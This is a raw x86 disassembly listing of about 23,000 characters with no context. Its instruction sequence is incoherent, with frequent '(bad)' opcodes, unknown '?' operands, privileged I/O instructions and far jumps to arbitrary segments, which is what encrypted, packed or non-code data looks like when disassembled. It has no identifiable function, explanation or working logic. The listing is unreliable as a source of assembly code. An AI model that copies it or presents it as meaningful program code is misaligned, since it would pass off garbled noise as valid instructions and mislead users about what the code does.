  4136c1:	xor    cl,BYTE PTR [esi-0x12]
  4136c4:	fild   DWORD PTR [esi-0x56652856]
  4136ca:	push   cs
  4136cb:	std    
  4136cc:	ds lahf 
  4136ce:	xchg   edi,eax
  4136cf:	(bad)  
  4136d0:	(bad)  
  4136d1:	fnstenv ds:0x3274b259
  4136d7:	shr    DWORD PTR [eax-0x63f9bc5d],cl
  4136dd:	pop    ecx
  4136de:	mul    BYTE PTR ds:0x7f18efca
  4136e4:	xor    eax,0x7f63766
  4136e9:	lea    edi,[esi+edi*2+0x5baf8297]
  4136f0:	test   al,0x96
  4136f2:	clc    
  4136f3:	sub    ecx,edi
  4136f5:	mov    ds:0xd1ac697c,eax
  4136fa:	popa   
  4136fb:	adc    eax,0xebe7480f
  413700:	bound  esp,QWORD PTR [ebx-0x6d]
  413703:	xchg   ebx,eax
  413704:	(bad)  
  413705:	fdiv   DWORD PTR [edi-0x6f6e69f7]
  41370b:	push   edi
  41370c:	adc    DWORD PTR [edx-0x11],ebp
  41370f:	add    BYTE PTR [eax-0x5f71bd2f],dl
  413715:	jle    0x41370b
  413717:	loope  0x413764
  413719:	fnstcw WORD PTR ds:0x8c9824c0
  41371f:	std    
  413720:	div    DWORD PTR fs:[edx+esi*1-0x74b7a33c]
  413728:	cli    
  413729:	mov    ah,0x3d
  41372b:	fmulp  st(3),st
  41372d:	(bad)  
  41372e:	fild   WORD PTR [edi+edi*1]
  413731:	cld    
  413732:	jl     0x41375b
  413734:	or     BYTE PTR [ebp+0x3181228d],0x23
  41373b:	pop    edi
  41373c:	push   ebx
  41373d:	pop    ecx
  41373e:	xlat   BYTE PTR ds:[ebx]
  41373f:	mov    edx,0x30a743c3
  413744:	mov    ?,WORD PTR [eax-0x7d]
  413747:	mov    cl,BYTE PTR [ebp+0x66]
  41374a:	je     0x4136db
  41374c:	out    0xb9,eax
  41374e:	rcr    DWORD PTR ss:[ebp+esi*1-0x742e2705],cl
  413756:	cmp    DWORD PTR es:[edx+0x63],ebp
  41375a:	and    ebx,DWORD PTR [eax-0x745753e1]
  413760:	loopne 0x413785
  413762:	mov    ch,cl
  413764:	mov    dh,0x1f
  413766:	jge    0x413702
  413768:	(bad)  
  413769:	xor    al,0x80
  41376b:	mov    DWORD PTR [edi],ebx
  41376d:	or     eax,DWORD PTR [edx]
  41376f:	add    DWORD PTR [edx],eax
  413771:	mov    bl,0x27
  413773:	lahf   
  413774:	push   cs
  413775:	fistp  WORD PTR [ebx-0x70]
  413778:	iret   
  413779:	dec    ecx
  41377a:	dec    esi
  41377b:	lock mov cl,0x9f
  41377e:	sar    ebx,1
  413780:	or     esp,DWORD PTR ds:0xca55094f
  413786:	out    dx,al
  413787:	xlat   BYTE PTR ds:[ebx]
  413788:	mov    BYTE PTR [esi+0x21],ch
  41378b:	xchg   DWORD PTR [ecx-0x4b3f9914],esp
  413791:	js     0x5c5efd36
  413797:	mov    eax,ds:0x4397cce0
  41379c:	fwait
  41379d:	xor    dh,BYTE PTR [ecx+eax*1]
  4137a0:	mov    dh,0x2
  4137a2:	dec    esp
  4137a3:	jl     0x413799
  4137a5:	xlat   BYTE PTR ds:[ebx]
  4137a6:	cmp    eax,0xef7fdc98
  4137ab:	cmc    
  4137ac:	repnz pop eax
  4137ae:	inc    esp
  4137af:	xor    al,0x6b
  4137b1:	sbb    eax,0x54b2fa61
  4137b6:	pop    ds
  4137b7:	or     eax,0xca1e25a
  4137bc:	ja     0x41373e
  4137be:	add    al,0x5f
  4137c0:	cmp    esi,ebx
  4137c2:	into   
  4137c3:	outs   dx,DWORD PTR ds:[esi]
  4137c4:	mov    ds:0x93392326,eax
  4137c9:	jmp    0x9234:0x90a7b2e6
  4137d0:	mov    BYTE PTR [eax],0x4b
  4137d3:	daa    
  4137d4:	loopne 0x4137fa
  4137d6:	leave  
  4137d7:	dec    esi
  4137d8:	and    edi,DWORD PTR [ebx-0x3527102a]
  4137de:	lea    ebp,[eax]
  4137e0:	mov    eax,ds:0x9c935231
  4137e5:	mov    eax,DWORD PTR [edi]
  4137e7:	mov    WORD PTR [ecx+0x68],ds
  4137ea:	cmp    edx,DWORD PTR ds:0xbcb5dfaa
  4137f0:	shr    DWORD PTR [edi+0x7da4cc72],cl
  4137f6:	neg    BYTE PTR [eax]
  4137f8:	sub    eax,0xd1a92832
  4137fd:	add    eax,0x32e114a1
  413802:	clc    
  413803:	data16 mov gs,WORD PTR [eax+0x22e6aa3]
  41380a:	fcomip st,st(6)
  41380c:	les    edi,FWORD PTR [esi+0x7d]
  41380f:	aad    0x88
  413811:	stos   DWORD PTR es:[edi],eax
  413812:	iret   
  413813:	pop    edx
  413814:	or     al,0x97
  413816:	mov    al,ds:0x1ec872f1
  41381b:	jno    0x4137f7
  41381d:	xchg   edx,eax
  41381e:	sbb    BYTE PTR ds:0xdd6aebec,ah
  413824:	enter  0x27a6,0x55
  413828:	mov    dh,0x34
  41382a:	cs out dx,eax
  41382c:	daa    
  41382d:	jns    0x41385b
  41382f:	sbb    eax,0xc22a5d09
  413834:	push   0x15
  413836:	push   edi
  413837:	enter  0x3d1b,0xd7
  41383b:	retf   0xbb3a
  41383e:	(bad)  
  41383f:	dec    ecx
  413840:	lds    edx,FWORD PTR [ebp+ebx*2-0x3266bb35]
  413847:	enter  0x9329,0x8c
  41384b:	sub    ecx,DWORD PTR [edi]
  41384d:	xchg   esp,eax
  41384e:	dec    esp
  41384f:	jge    0x41386c
  413851:	in     eax,0x47
  413853:	push   edx
  413854:	pop    eax
  413855:	sbb    dl,bh
  413857:	inc    ebx
  413858:	mov    DWORD PTR [eax+eiz*8-0x4360b73d],ebx
  41385f:	pop    ecx
  413860:	inc    eax
  413861:	inc    ebx
  413862:	sub    al,0x52
  413864:	and    eax,0xc779bbc4
  413869:	adc    al,0x30
  41386b:	inc    ecx
  41386c:	shr    DWORD PTR ds:0x17858e,cl
  413872:	shl    ebx,0x96
  413875:	in     eax,0x40
  413877:	test   al,0x40
  413879:	out    0x68,eax
  41387b:	push   ds
  41387c:	push   eax
  41387d:	je     0x4138af
  41387f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413880:	shr    DWORD PTR [ecx+edi*2-0x1a],cl
  413884:	ins    BYTE PTR es:[edi],dx
  413885:	call   0x5dd481fd
  41388a:	retf   
  41388b:	push   esi
  41388c:	(bad)  
  41388d:	pop    edx
  41388e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41388f:	les    ebx,FWORD PTR [edi+0x28ed146b]
  413895:	adc    al,0x47
  413897:	cs mov edi,0xcbd45bb6
  41389d:	repz mov eax,0x6f948deb
  4138a3:	add    al,0xf
  4138a5:	sbb    bl,bh
  4138a7:	pop    ebp
  4138a8:	jb     0x4138dc
  4138aa:	bnd gs jl 0x4138bc
  4138ae:	xor    al,dh
  4138b0:	das    
  4138b1:	xor    al,0xbf
  4138b3:	pop    ss
  4138b4:	push   0xbc8ac218
  4138b9:	mov    ecx,0x5cbc6196
  4138be:	jbe    0x4138f6
  4138c0:	iret   
  4138c1:	pop    ds
  4138c2:	aaa    
  4138c3:	int3   
  4138c4:	leave  
  4138c5:	lods   eax,DWORD PTR ds:[esi]
  4138c6:	hlt    
  4138c7:	test   DWORD PTR [esp+edi*1+0x23],ecx
  4138cb:	push   esi
  4138cc:	test   BYTE PTR [ebx+0x45075cd4],ah
  4138d2:	inc    eax
  4138d3:	pop    es
  4138d4:	xchg   esi,eax
  4138d5:	pop    edx
  4138d6:	hlt    
  4138d7:	xlat   BYTE PTR ds:[ebx]
  4138d8:	inc    esp
  4138d9:	adc    ch,ch
  4138db:	sbb    bh,bl
  4138dd:	(bad)  
  4138de:	in     eax,dx
  4138df:	pop    edx
  4138e0:	xor    al,0xc7
  4138e2:	call   0xf3db103b
  4138e7:	enter  0x4b35,0x43
  4138eb:	jg     0x41387a
  4138ed:	mov    ds:0x84aa0c7e,al
  4138f2:	mov    bh,0xd1
  4138f4:	push   edx
  4138f5:	cwde   
  4138f6:	inc    ecx
  4138f7:	mov    dh,0xe3
  4138f9:	js     0x413926
  4138fb:	out    0x4d,al
  4138fd:	cmc    
  4138fe:	test   BYTE PTR [edx+0x6c],cl
  413901:	xchg   esi,eax
  413902:	add    BYTE PTR [edx+eiz*8+0x5fb00717],bh
  413909:	inc    esi
  41390a:	mov    ebx,0x2c8e3191
  41390f:	daa    
  413910:	pop    es
  413911:	push   eax
  413912:	(bad)  
  413913:	jmp    0x4138fe
  413915:	jg     0x413940
  413917:	cmp    al,0xfa
  413919:	into   
  41391a:	loope  0x413939
  41391c:	push   ds
  41391d:	aas    
  41391e:	not    BYTE PTR [edi]
  413920:	xchg   edi,eax
  413921:	je     0x413979
  413923:	add    eax,ecx
  413925:	ret    
  413926:	add    DWORD PTR [edi+0x9],0xffffffde
  41392a:	xlat   BYTE PTR ds:[ebx]
  41392b:	adc    BYTE PTR [ebp+0x69],cl
  41392e:	adc    BYTE PTR [eax],dh
  413930:	dec    eax
  413931:	push   es
  413932:	mov    ebp,0x47a48883
  413937:	mov    eax,0x75127cb7
  41393c:	push   ds
  41393d:	xor    BYTE PTR [esi-0x2c443fd],dl
  413943:	adc    eax,0xb6534951
  413948:	and    eax,DWORD PTR [esi-0x58]
  41394b:	push   0xffffffd4
  41394d:	leave  
  41394e:	jb     0x413990
  413950:	and    BYTE PTR [ebx],0x4f
  413953:	pop    edi
  413954:	sbb    al,0x77
  413956:	jmp    0x413931
  413958:	call   0xd4e7:0xd5dce6a8
  41395f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413960:	jns    0x4138e3
  413962:	out    dx,al
  413963:	ficom  WORD PTR [esi+edi*1+0x4d]
  413967:	dec    esi
  413968:	inc    BYTE PTR [esi+0xaddccc2]
  41396e:	dec    esp
  41396f:	sub    eax,0x2f0ef50a
  413974:	shr    edi,cl
  413976:	adc    eax,0xb595dce9
  41397b:	(bad)  
  41397c:	fwait
  41397d:	inc    esp
  41397e:	loope  0x413976
  413980:	neg    BYTE PTR [esi+0x6809e36a]
  413986:	jbe    0x4139d2
  413988:	mov    al,ds:0x1aebbdbf
  41398d:	clc    
  41398e:	xor    esi,DWORD PTR [ecx+ecx*8-0x6bedf2e0]
  413995:	sub    al,BYTE PTR [ebx+0xd327372]
  41399b:	push   0x2b
  41399d:	pusha  
  41399e:	push   esi
  41399f:	pop    esi
  4139a0:	sub    eax,0x2c477098
  4139a5:	lahf   
  4139a6:	scas   al,BYTE PTR es:[edi]
  4139a7:	pop    ds
  4139a8:	repnz mov BYTE PTR [ebx+ebp*4],ah
  4139ac:	xor    edx,DWORD PTR [esi]
  4139ae:	or     dl,BYTE PTR [ecx-0x47]
  4139b1:	xchg   esi,eax
  4139b2:	mov    dh,0x90
  4139b4:	pop    edi
  4139b5:	jb     0x4139d7
  4139b7:	(bad)  
  4139b9:	mov    dh,0xd8
  4139bb:	in     eax,dx
  4139bc:	pop    edx
  4139bd:	adc    al,dl
  4139bf:	mov    ah,0xac
  4139c1:	outs   dx,DWORD PTR ds:[esi]
  4139c2:	lods   eax,DWORD PTR ds:[esi]
  4139c3:	jecxz  0x413a00
  4139c5:	aaa    
  4139c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139c7:	cmp    DWORD PTR [ebp-0x6e1e1de9],edx
  4139cd:	add    ch,BYTE PTR [edx]
  4139cf:	adc    ch,cl
  4139d1:	mov    DWORD PTR [ecx-0x5e],ecx
  4139d4:	xor    BYTE PTR [esi],ch
  4139d6:	mov    BYTE PTR [eax-0x60],ch
  4139d9:	sub    DWORD PTR [ebx+ebx*8],edi
  4139dc:	jo     0x413a1a
  4139de:	cwd    
  4139e0:	jp     0x4139c4
  4139e2:	sbb    al,0x98
  4139e4:	or     bh,BYTE PTR cs:[esi]
  4139e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139e8:	or     al,0x82
  4139ea:	push   ss
  4139eb:	popa   
  4139ec:	lea    ebp,[ebp-0x39]
  4139ef:	xor    BYTE PTR [eax+0x39],bh
  4139f2:	mov    cl,0xaf
  4139f4:	gs cs ds scas eax,DWORD PTR es:[edi]
  4139f8:	shl    DWORD PTR [esi+edi*2+0x1f95e190],1
  4139ff:	cdq    
  413a00:	sub    eax,0x6ebc700e
  413a05:	or     BYTE PTR [ecx+0x3],0xcb
  413a09:	out    dx,eax
  413a0a:	(bad)  
  413a0b:	mov    fs,WORD PTR [edi-0x18]
  413a0e:	sbb    BYTE PTR [eax],dl
  413a10:	mov    ds:0xd9a6dfaa,al
  413a15:	inc    ebp
  413a16:	loop   0x4139d5
  413a18:	and    eax,0x77039a37
  413a1d:	ds pop esp
  413a1f:	aad    0x50
  413a21:	and    eax,0x7cf2b555
  413a26:	pop    ebx
  413a27:	jb     0x413a5d
  413a29:	aas    
  413a2a:	and    DWORD PTR fs:[edi-0x696c6fd8],esi
  413a31:	mov    ch,0x70
  413a33:	or     edi,esi
  413a35:	test   esp,edi
  413a37:	out    0xbb,eax
  413a39:	mov    eax,ds:0xe016a08e
  413a3e:	sbb    eax,0x23c371c1
  413a43:	das    
  413a44:	mov    esi,DWORD PTR [edx-0x4f888fbe]
  413a4a:	js     0x413a97
  413a4c:	ret    
  413a4d:	call   0x5fba77c8
  413a52:	jb     0x413a70
  413a54:	xchg   esp,eax
  413a55:	retf   0x6004
  413a58:	fcom   QWORD PTR [esi]
  413a5a:	adc    ch,bh
  413a5c:	shr    dl,0x77
  413a5f:	push   es
  413a60:	loope  0x413a55
  413a62:	xchg   ebp,eax
  413a63:	sub    BYTE PTR [eax],bh
  413a65:	mov    DWORD PTR [edx],0xe1fe807c
  413a6b:	leave  
  413a6c:	out    dx,al
  413a6d:	xor    eax,0x1d77ca09
  413a72:	rcl    DWORD PTR [ebp-0x2ede04f6],1
  413a78:	(bad)
  413a7d:	xor    eax,0xabef9ece
  413a82:	lea    ebp,[edx]
  413a84:	repnz push edi
  413a86:	adc    eax,0xae37e189
  413a8b:	fwait
  413a8c:	ins    DWORD PTR es:[edi],dx
  413a8d:	stos   DWORD PTR es:[edi],eax
  413a8e:	sbb    dh,bl
  413a90:	sub    ch,BYTE PTR ds:0x97fce6ad
  413a96:	jb     0x413af9
  413a98:	inc    edx
  413a99:	test   DWORD PTR [eax+0x59],esp
  413a9c:	ins    DWORD PTR es:[edi],dx
  413a9d:	div    DWORD PTR [edi-0x46]
  413aa0:	jg     0x413afd
  413aa2:	loopne 0x413b22
  413aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413aa5:	addr16 sahf 
  413aa7:	das    
  413aa8:	hlt    
  413aa9:	loopne 0x413ac0
  413aab:	xchg   esi,eax
  413aac:	push   esp
  413aad:	fsub   DWORD PTR [ebx+0x621908b2]
  413ab3:	cs mov edx,0x42354bad
  413ab9:	mov    al,al
  413abb:	imul   eax,ecx,0xcd51bfa7
  413ac1:	push   ds
  413ac2:	dec    ebp
  413ac3:	xor    al,0xae
  413ac5:	lahf   
  413ac6:	and    bh,BYTE PTR [ebx]
  413ac8:	pop    esp
  413ac9:	sub    dh,BYTE PTR [edi-0x3a61a812]
  413acf:	aas    
  413ad0:	cmp    edx,DWORD PTR [eax]
  413ad2:	nop
  413ad3:	adc    al,0x37
  413ad5:	pop    esp
  413ad6:	(bad)  
  413ad8:	push   cs
  413ad9:	jg     0x413b2f
  413adb:	mov    ebp,0xf9c01f02
  413ae0:	aam    0xa0
  413ae2:	ret    0x37d0
  413ae5:	mov    ds:0x7dc48e6c,al
  413aea:	push   edx
  413aeb:	jp     0x413ad8
  413aed:	xor    BYTE PTR [edi+0x36501489],ch
  413af3:	add    eax,DWORD PTR [edx]
  413af5:	fwait
  413af6:	jecxz  0x413af0
  413af8:	call   0x1fb4:0xfd5a2591
  413aff:	lea    ebp,[ebp+0x67]
  413b02:	mov    eax,0x8b7752e1
  413b07:	fsubp  st(0),st
  413b09:	push   ds
  413b0a:	test   al,0x4a
  413b0c:	lock sahf 
  413b0e:	inc    esi
  413b0f:	inc    edx
  413b10:	out    dx,eax
  413b11:	mov    bh,0xa4
  413b13:	and    al,0x2f
  413b15:	mov    edi,0x8016778a
  413b1a:	add    BYTE PTR [ebx-0x65e9ee7e],al
  413b20:	jae    0x413afa
  413b22:	add    cl,dl
  413b24:	stos   BYTE PTR es:[edi],al
  413b25:	mov    ds:0xda6c03cf,al
  413b2a:	pop    ebx
  413b2b:	push   es
  413b2c:	rol    DWORD PTR [ecx-0x2d],cl
  413b2f:	js     0x413b26
  413b31:	pop    eax
  413b32:	aad    0xf9
  413b34:	xchg   edi,eax
  413b35:	int    0x80
  413b37:	jne    0x413ade
  413b39:	or     al,0x83
  413b3b:	dec    ecx
  413b3c:	(bad)  
  413b3e:	dec    ebp
  413b3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b40:	pop    ecx
  413b41:	jecxz  0x413bac
  413b43:	fwait
  413b44:	push   0x28
  413b46:	pop    es
  413b47:	(bad)  
  413b48:	xchg   esp,eax
  413b49:	xor    bl,al
  413b4b:	loopne 0x413b20
  413b4d:	xor    BYTE PTR [edi-0x16a2af2f],bh
  413b53:	dec    edi
  413b54:	int3   
  413b55:	pop    esp
  413b56:	xchg   ebp,eax
  413b57:	push   ecx
  413b58:	xor    eax,0x75c98f84
  413b5d:	or     DWORD PTR ds:0xe1953750,edx
  413b63:	(bad)  
  413b64:	out    0x31,eax
  413b66:	shl    BYTE PTR [eax+0x14],1
  413b69:	sbb    ah,ah
  413b6b:	arpl   WORD PTR ds:[eax],cx
  413b6e:	js     0x413b86
  413b70:	sbb    DWORD PTR [edx],eax
  413b72:	mov    ebx,0xdd781f8
  413b77:	cmc    
  413b78:	jle    0x413be5
  413b7a:	pop    esp
  413b7b:	hlt    
  413b7c:	cdq    
  413b7d:	jb     0x413b33
  413b7f:	pusha  
  413b80:	jno    0x413b61
  413b82:	mov    al,0xf2
  413b84:	cli    
  413b85:	pushf  
  413b86:	push   ebp
  413b87:	and    al,0x22
  413b89:	mov    bl,0x7f
  413b8b:	or     esp,DWORD PTR [edx-0x27eb5366]
  413b91:	sub    eax,0xa3f4148d
  413b96:	lods   eax,DWORD PTR ds:[esi]
  413b97:	test   bh,0x1
  413b9a:	mov    BYTE PTR [ebp+esi*2+0x468b1706],dh
  413ba1:	mov    bl,0xf3
  413ba3:	in     al,0x6b
  413ba5:	call   0x7b63:0xae566fe9
  413bac:	cli    
  413bad:	hlt    
  413bae:	push   ebp
  413baf:	pop    ecx
  413bb0:	scas   al,BYTE PTR es:[edi]
  413bb1:	push   ebp
  413bb2:	dec    edx
  413bb3:	push   eax
  413bb4:	int3   
  413bb5:	outs   dx,DWORD PTR ds:[esi]
  413bb6:	pop    ecx
  413bb7:	inc    esi
  413bb8:	repnz cli 
  413bba:	stos   BYTE PTR es:[edi],al
  413bbb:	mov    BYTE PTR [ebp+0x22],cl
  413bbe:	jle    0x413c20
  413bc0:	mov    ebx,0xfd4eae59
  413bc5:	data16 ja 0x413bdb
  413bc8:	and    BYTE PTR [esi+0x25],al
  413bcb:	inc    ebp
  413bcc:	pop    ebp
  413bcd:	pusha  
  413bce:	mov    esp,ebx
  413bd0:	fnstenv ds:0x538ebdae
  413bd6:	imul   eax,DWORD PTR [edx+0x7d],0x27
  413bda:	icebp  
  413bdb:	adc    BYTE PTR [esi],bl
  413bdd:	retf   
  413bde:	sbb    esp,DWORD PTR [edx]
  413be0:	outs   dx,DWORD PTR ds:[esi]
  413be1:	cmp    DWORD PTR [ebp+0x6a],esi
  413be4:	xlat   BYTE PTR ds:[bx]
  413be6:	lods   al,BYTE PTR ds:[esi]
  413be7:	in     eax,0xb6
  413be9:	push   esp
  413bea:	jg     0x413c15
  413bec:	fldcw  WORD PTR [ebx+0x499b7d5]
  413bf2:	call   0x4585:0xd20b1c0
  413bf9:	jmp    0x413c51
  413bfb:	mov    esi,0xfbe32015
  413c00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c01:	adc    al,0xc5
  413c03:	test   DWORD PTR [ecx],0xe5673d28
  413c09:	hlt    
  413c0a:	shl    DWORD PTR [ebx],0x85
  413c0d:	icebp  
  413c0e:	sbb    DWORD PTR [edx-0x47],esi
  413c11:	shr    BYTE PTR [edi-0x4a8898c9],cl
  413c17:	pop    eax
  413c18:	dec    BYTE PTR [ebp+edx*4+0x63a200b5]
  413c1f:	jmp    0x4d35a51e
  413c24:	mov    eax,ds:0x1ffa128a
  413c29:	gs mov cl,0x74
  413c2c:	out    0x16,eax
  413c2e:	pop    sp
  413c30:	xchg   esp,eax
  413c31:	jb     0x413c6d
  413c33:	imul   esp,DWORD PTR [ecx+0x69],0x51
  413c37:	xor    al,BYTE PTR [esi]
  413c39:	pushf  
  413c3a:	je     0x413c7f
  413c3c:	stos   DWORD PTR es:[edi],eax
  413c3d:	(bad)  
  413c3e:	xor    DWORD PTR [ebp+0x31d33bc9],ecx
  413c44:	jo     0x413c15
  413c46:	mov    eax,ds:0x8d1a2343
  413c4b:	in     eax,0x57
  413c4d:	mov    eax,ds:0x706dfed0
  413c52:	and    al,0xda
  413c54:	push   0xffffff93
  413c56:	test   eax,0x60fd2b0e
  413c5b:	es aam 0x62
  413c5e:	push   ebp
  413c5f:	jle    0x413c79
  413c61:	adc    BYTE PTR [ebx+eax*8+0x4956f39e],bl
  413c68:	jae    0x413c4a
  413c6a:	mov    bh,0xae
  413c6c:	pop    edx
  413c6d:	repnz into 
  413c6f:	jno    0x413c10
  413c71:	enter  0x2ad9,0xe5
  413c75:	pop    eax
  413c76:	stos   BYTE PTR es:[edi],al
  413c77:	push   esi
  413c78:	adc    al,0x1f
  413c7a:	jbe    0x413c82
  413c7c:	js     0x413cf7
  413c7e:	mov    ecx,0xdba6961f
  413c83:	shl    BYTE PTR [edi+edi*4+0x2b],1
  413c87:	fdiv   DWORD PTR [ecx+0x253329f1]
  413c8d:	gs push ss
  413c8f:	mov    eax,ds:0x8655328
  413c94:	aad    0x72
  413c96:	sahf   
  413c97:	pusha  
  413c98:	js     0x413cd8
  413c9a:	xchg   esp,eax
  413c9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c9d:	test   eax,0x69595e8f
  413ca2:	dec    ebx
  413ca3:	jne    0x413c7c
  413ca5:	mov    ?,WORD PTR [ecx+0x2a75e824]
  413cab:	pop    ecx
  413cac:	nop
  413cad:	jae    0x413cd5
  413caf:	iret   
  413cb0:	outs   dx,DWORD PTR ds:[esi]
  413cb1:	adc    BYTE PTR [ecx],bl
  413cb3:	adc    DWORD PTR cs:[ebx],0x42
  413cb7:	dec    esp
  413cb8:	out    dx,al
  413cb9:	xchg   ebp,eax
  413cba:	mov    ah,0x4f
  413cbc:	sbb    eax,0x7adc2079
  413cc1:	cmp    BYTE PTR [edx+eiz*8+0x57ab55d],bh
  413cc8:	outs   dx,BYTE PTR ds:[esi]
  413cc9:	test   DWORD PTR [ecx],ecx
  413ccb:	leave  
  413ccc:	sbb    al,dl
  413cce:	test   al,0xde
  413cd0:	inc    esi
  413cd1:	ins    BYTE PTR es:[edi],dx
  413cd2:	pusha  
  413cd3:	dec    ebp
  413cd4:	pop    edi
  413cd5:	das    
  413cd6:	sbb    eax,0x7431a6aa
  413cdb:	clc    
  413cdc:	rol    DWORD PTR [edi],1
  413cde:	shr    DWORD PTR [eax+0x7f],0xd0
  413ce2:	cmp    edi,DWORD PTR [esi+eiz*1+0x769732a3]
  413ce9:	sbb    eax,0xe3918ce5
  413cee:	inc    eax
  413cef:	mov    al,ds:0xadf40b8a
  413cf4:	shl    dl,cl
  413cf6:	cwde   
  413cf7:	xor    DWORD PTR [ecx],edx
  413cf9:	int3   
  413cfa:	nop
  413cfb:	jne    0x413c94
  413cfd:	iret   
  413cfe:	xor    bh,BYTE PTR [edi-0x68aee3fb]
  413d04:	xchg   ecx,eax
  413d05:	push   ecx
  413d06:	out    0xf3,al
  413d08:	cmp    DWORD PTR [ebx+0x72d73208],esp
  413d0e:	lock or BYTE PTR [ecx],dh
  413d11:	faddp  st(6),st
  413d13:	mov    al,ds:0x67ba2d72
  413d18:	call   0xd9b3c98f
  413d1d:	ret    0x7778
  413d20:	xor    bh,cl
  413d22:	mov    WORD PTR [edi-0x51],ss
  413d25:	adc    al,0x2c
  413d27:	test   DWORD PTR [ebx+0xa2678d3],0x2c20a7e
  413d31:	popf   
  413d32:	neg    DWORD PTR [ebp+ebp*1-0xc80a788]
  413d39:	mov    eax,0x3964dbe
  413d3e:	dec    edi
  413d3f:	rcr    cl,cl
  413d41:	xchg   BYTE PTR [ebx+0x2d],ah
  413d44:	mov    es,WORD PTR [ebx-0x5]
  413d47:	lock imul ebx,DWORD PTR [esp+ecx*1+0x7349b8a3],0xa331ee24
  413d53:	push   ebp
  413d54:	or     eax,0x3c7963d6
  413d59:	lods   eax,DWORD PTR ds:[esi]
  413d5a:	cmc    
  413d5b:	sbb    dl,BYTE PTR [edx+0x30]
  413d5e:	add    DWORD PTR [esi-0x4b],esi
  413d61:	enter  0x3488,0x72
  413d65:	add    eax,0xc0edfba4
  413d6a:	loope  0x413d15
  413d6c:	jne    0x413dbd
  413d6e:	sub    eax,0xffffffad
  413d71:	lods   al,BYTE PTR ds:[esi]
  413d72:	stos   DWORD PTR es:[edi],eax
  413d73:	push   ebp
  413d74:	and    eax,0x3fc12dd0
  413d79:	fwait
  413d7a:	adc    ch,bh
  413d7c:	out    0x3b,al
  413d7e:	ss enter 0xca13,0x98
  413d83:	sbb    eax,0x6161a1cd
  413d88:	je     0x413d10
  413d8a:	push   ss
  413d8b:	jp     0x413da0
  413d8d:	pop    esp
  413d8e:	sbb    eax,DWORD PTR [eax]
  413d90:	push   ss
  413d91:	sbb    eax,0x7f2d62f3
  413d96:	mov    ebx,0xed95cfe2
  413d9b:	icebp  
  413d9c:	push   0xffffff98
  413d9e:	jne    0x413d6f
  413da0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413da1:	(bad)  
  413da2:	adc    eax,0x8937b4e
  413da7:	int    0xce
  413da9:	mov    esp,0xc7d072d3
  413dae:	fist   WORD PTR [eax+0xaec1535]
  413db4:	fwait
  413db5:	mul    BYTE PTR [edx]
  413db7:	mov    dh,0x14
  413db9:	xchg   ebx,eax
  413dba:	nop
  413dbb:	or     ch,dh
  413dbd:	sbb    DWORD PTR [eax+0x72],0x214c1a8c
  413dc4:	(bad)  
  413dc5:	into   
  413dc6:	push   edi
  413dc7:	xlat   BYTE PTR ds:[ebx]
  413dc8:	mov    WORD PTR [ecx+0x2e077026],?
  413dce:	out    dx,al
  413dcf:	push   ds
  413dd0:	std    
  413dd1:	dec    eax
  413dd2:	add    eax,edi
  413dd4:	xor    eax,0x2a845fbc
  413dd9:	je     0x413e2e
  413ddb:	push   ds
  413ddc:	push   ds
  413ddd:	es dec ebx
  413ddf:	dec    ebp
  413de0:	scas   al,BYTE PTR es:[edi]
  413de1:	jge    0x413e10
  413de3:	jmp    0x64e6:0x2d66d241
  413dea:	cmovg  esi,edi
  413ded:	jno    0x413e26
  413def:	sbb    dh,BYTE PTR [edx+ebx*4]
  413df2:	out    0xc1,al
  413df4:	sti    
  413df5:	popf   
  413df6:	or     al,0xf5
  413df8:	iret   
  413df9:	or     eax,0xdb9c7141
  413dfe:	inc    esi
  413dff:	daa    
  413e00:	lods   al,BYTE PTR ds:[esi]
  413e01:	jmp    0x413de7
  413e03:	mov    esi,DWORD PTR [ebx-0x54]
  413e06:	popa   
  413e07:	xor    eax,0x16026a1c
  413e0c:	xlat   BYTE PTR ds:[ebx]
  413e0d:	hlt    
  413e0e:	or     eax,0xef876fa5
  413e13:	out    0xbf,al
  413e15:	xor    eax,0x85dd4770
  413e1a:	arpl   cx,si
  413e1c:	cld    
  413e1d:	out    0xb4,eax
  413e1f:	in     al,dx
  413e20:	inc    eax
  413e21:	xor    ebp,DWORD PTR [ebx-0x57]
  413e24:	test   al,0xc4
  413e26:	scas   eax,DWORD PTR es:[edi]
  413e27:	loopne 0x413e53
  413e29:	aas    
  413e2a:	sbb    eax,0x4eba660
  413e2f:	out    dx,eax
  413e30:	push   cs
  413e31:	sub    eax,esp
  413e33:	adc    BYTE PTR [ebx-0x24],0xad
  413e37:	mov    dl,0xcb
  413e39:	daa    
  413e3a:	inc    esp
  413e3b:	inc    esp
  413e3c:	aas    
  413e3d:	int3   
  413e3e:	mov    ebp,0xd27c691c
  413e43:	lods   eax,DWORD PTR ds:[esi]
  413e44:	mov    ds:0x979d5108,eax
  413e49:	jno    0x413e36
  413e4b:	push   cs
  413e4c:	leave  
  413e4d:	int3   
  413e4e:	mov    ebp,0x2a6ca97c
  413e53:	retf   
  413e54:	mov    esi,0xba513cc8
  413e59:	xchg   ebp,eax
  413e5a:	es jmp 0x413ed8
  413e5d:	mov    ds:0x2a02ff0c,eax
  413e62:	in     eax,dx
  413e63:	adc    ebp,DWORD PTR [ebp-0x2a]
  413e66:	adc    al,0x77
  413e68:	ret    0xb604
  413e6b:	mov    ch,0xa4
  413e6d:	xchg   esi,eax
  413e6e:	xchg   BYTE PTR [edx+eiz*2-0x60f2187],bh
  413e75:	jb     0x413e9c
  413e77:	sbb    BYTE PTR [edx-0x49],dh
  413e7a:	neg    DWORD PTR [ecx]
  413e7c:	adc    al,0xe7
  413e7e:	inc    ebp
  413e7f:	into   
  413e80:	pop    esi
  413e81:	push   edi
  413e82:	jle    0x413ee2
  413e84:	int    0xea
  413e86:	sbb    al,0x8f
  413e88:	jmp    DWORD PTR [edi+ecx*2]
  413e8b:	bnd jae 0x413e3b
  413e8e:	inc    edx
